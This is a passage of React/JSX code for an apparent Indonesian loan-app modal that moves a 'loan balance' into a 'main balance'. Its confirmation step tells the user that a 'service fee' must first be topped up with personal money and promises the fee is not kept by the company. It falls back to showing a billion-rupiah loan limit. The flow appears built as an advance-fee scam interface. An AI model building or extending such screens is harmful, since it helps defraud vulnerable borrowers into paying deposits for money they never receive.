            className="mt-6 w-full rounded-2xl bg-primary-700 py-4 text-base font-black text-white shadow-lg shadow-primary-700/30 transition hover:bg-primary-800 active:scale-[0.98]"
          >
            {cPindah.button_text || "Pindahkan Saldo"}
          </button>
        </div>
      )}

      {isPindahSaldoState && pindahStep === "konfirmasi" && (
        /* GAMBAR 2: Konfirmasi Pemindahan */
        <div className="py-2 space-y-4">
          <h3 className="text-xl font-black text-slate-900 text-center">
            Konfirmasi Pemindahan
          </h3>

          {/* Card 1: Sumber Dana Saldo Pinjaman */}
          <div className="rounded-2xl border border-slate-200/80 bg-slate-50/70 p-4 flex items-center justify-between">
            <div>
              <p className="text-[11px] font-black uppercase tracking-wider text-slate-400">
                SUMBER DANA: SALDO PINJAMAN
              </p>
              <p className="mt-1 text-lg font-black text-slate-800">
                {formatRupiah(user?.paylater_limit ?? 1000000000)}
              </p>
            </div>
            <div className="grid h-10 w-10 place-items-center rounded-xl bg-teal-50 text-[#00D1B2]">
              <Wallet className="h-6 w-6" />
            </div>
          </div>

          {/* Card 2: Tujuan Saldo Utama */}
          <div className="rounded-2xl border border-slate-200/80 bg-slate-50/70 p-4 flex items-center justify-between">
            <div>
              <p className="text-[11px] font-black uppercase tracking-wider text-slate-400">
                TUJUAN: SALDO UTAMA
              </p>
              <p className="mt-1 text-lg font-black text-slate-800">
                {formatRupiah(user?.balance ?? 10000000)}
              </p>
            </div>
            <div className="grid h-10 w-10 place-items-center rounded-xl bg-purple-50 text-primary-700">
              <Landmark className="h-6 w-6" />
            </div>
          </div>

          {/* Input Nominal Dipindahkan */}
          <div>
            <label className="block text-[11px] font-black uppercase tracking-wider text-primary-700 mb-1.5">
              NOMINAL DIPINDAHKAN
            </label>
            <div className="relative">
              <input
                type="text"
                inputMode="numeric"
                value={pindahNominal ? "Rp " + new Intl.NumberFormat("id-ID").format(Number(pindahNominal)) : "Rp 0"}
                onChange={(e) => {
                  const val = digitsOnly(e.target.value);
                  setPindahNominal(val);
                }}
                className="w-full rounded-2xl border border-slate-300 p-4 text-base font-black text-slate-800 focus:border-primary-600 focus:outline-none focus:ring-1 focus:ring-primary-600"
                placeholder="Rp 0"
              />
            </div>
          </div>

          {/* Tombol Aksi */}
          <div className="flex items-center gap-3 pt-2">
            <button
              type="button"
              onClick={() => setPindahStep("info")}
              className="rounded-2xl bg-slate-100 py-3.5 px-6 text-sm font-black text-slate-500 hover:bg-slate-200"
            >
              Batal
            </button>
            <button
              type="button"
              onClick={() => {
                const n = Number(pindahNominal);
                if (!n || n <= 0) return toast.error("Masukkan nominal yang akan dipindahkan");
                startDelayedTransition(
                  {
                    key: `l4_${Date.now()}`,
                    title: "Memproses Pemindahan Saldo...",
                    subtitle: "Sistem sedang memverifikasi nominal dan menyiapkan rincian perpindahan saldo Anda.",
                  },
                  () => setPindahStep("rincian")
                );
              }}
              className="flex-1 rounded-2xl bg-primary-700 py-3.5 text-sm font-black text-white shadow-lg shadow-primary-700/30 transition hover:bg-primary-800"
            >
              Lanjutkan
            </button>
          </div>
        </div>
      )}

      {isPindahSaldoState && pindahStep === "rincian" && (
        /* GAMBAR 3: Rincian Perpindahan */
        <div className="py-2 space-y-4">
          <h3 className="text-xl font-black text-slate-900 text-center">
            Rincian Perpindahan
          </h3>

          {/* Kotak Peringatan Kuning/Amber */}
          <div className="rounded-3xl border border-amber-200/80 bg-[#FFFBEB] p-4 text-left space-y-3">
            <div className="flex items-start gap-2.5">
              <span className="grid h-5 w-5 place-items-center rounded-full bg-amber-500 text-white shrink-0 mt-0.5 font-black text-xs">
                !
              </span>
              <div className="text-xs font-semibold text-slate-700 leading-relaxed space-y-2">
                <p>
                  Perpindahan Saldo Pinjaman ke Saldo utama membutuhkan <b>Dana Layanan</b>. Dana tersebut harus melalui proses Topup Saldo menggunakan dana pribadi Anda.
                </p>
                <p className="font-bold text-amber-900">
                  Dana Layanan ini Akan Tetap Masuk ke Saldo Anda, tidak diambil perusahaan.
                </p>
              </div>
            </div>
          </div>

          {/* Rincian Transaksi */}
          <div className="rounded-2xl border border-slate-100 bg-white p-4 divide-y divide-slate-100 text-xs sm:text-sm font-semibold">
            <div className="flex items-center justify-between py-2.5">
              <span className="text-slate-500">Kirim Saldo Ke</span>
              <span className="font-black text-slate-800">Saldo Utama</span>
            </div>
            <div className="flex items-center justify-between py-2.5">
              <span className="text-slate-500">Dari Saldo</span>
              <span className="font-black text-slate-800">Saldo Pinjaman</span>
            </div>
            <div className="flex items-center justify-between py-2.5">
              <span className="text-slate-500">Jumlah Saldo</span>
              <span className="font-black text-slate-800">
                {formatRupiah(Number(pindahNominal) || 10000)}
              </span>
            </div>
            <div className="flex items-center justify-between py-2.5">
              <span className="text-slate-500">Dana Layanan</span>
              <span className="font-black text-emerald-600">
                {formatRupiah(pindahFeeAmount)}
              </span>
            </div>
          </div>

          {/* Tombol Aksi */}
          <div className="flex items-center gap-3 pt-2">
            <button
              type="button"
              onClick={() => setPindahStep("konfirmasi")}
              className="rounded-2xl bg-slate-100 py-3.5 px-6 text-sm font-black text-slate-500 hover:bg-slate-200"
            >
              Kembali
            </button>
            <button
              type="button"
              onClick={() => {
                handleClose();
                onTopUp(pindahFeeAmount);
              }}
              className="flex-1 rounded-2xl bg-[#00D1B2] py-3.5 text-sm font-black text-white shadow-lg shadow-[#00D1B2]/30 transition hover:bg-[#00c4a7]"
            >
              Top Up
            </button>
          </div>
        </div>
      )}
        </>
      )}
    </Modal>
  );
}
